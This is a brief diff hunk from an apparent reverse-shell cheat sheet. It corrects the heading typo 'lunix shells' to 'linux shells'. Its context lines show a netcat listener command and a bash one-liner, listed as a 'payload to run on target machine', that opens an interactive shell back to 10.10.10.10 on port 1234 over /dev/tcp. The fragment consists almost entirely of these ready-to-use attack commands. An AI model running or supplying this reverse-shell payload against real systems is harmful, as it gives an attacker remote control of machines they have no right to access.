@@ -17,7 +17,7 @@ nc -lvnp <port-number>
 
 payloads to run on target machine:
 
-lunix shells:
+linux shells:
 ``` bash
 
 	bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
